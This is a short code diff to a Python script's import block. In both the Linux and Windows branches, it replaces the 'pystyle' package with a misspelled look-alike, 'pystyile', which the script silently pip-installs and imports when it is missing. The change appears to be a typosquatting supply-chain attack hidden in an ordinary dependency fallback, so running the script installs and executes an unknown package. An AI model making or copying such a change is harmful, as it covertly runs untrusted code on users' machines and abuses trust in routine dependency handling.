@@ -14,10 +14,10 @@ if platform.system().startswith("Linux"):
         os.system("python3 -m pip install termcolor -q -q -q")
         import termcolor
     try:
-        from pystyle import *
+        from pystyile import *
     except:
-        os.system("python3 -m pip install pystyle -q -q -q")
-        from pystyle import *
+        os.system("python3 -m pip install pystyile -q -q -q")
+        from pystyile import *
     try:
         import colorama
         from colorama import Fore, Back, Style
@@ -40,10 +40,10 @@ elif platform.system().startswith("Windows"):
         import colorama
         from colorama import Fore, Back, Style
     try:
-        from pystyle import *
+        from pystyile import *
     except:
-        os.system("python -m pip install pystyle -q -q -q")
-        from pystyle import *
+        os.system("python -m pip install pystyile -q -q -q")
+        from pystyile import *
 
 colorama.deinit()
 banner = Center.XCenter("""
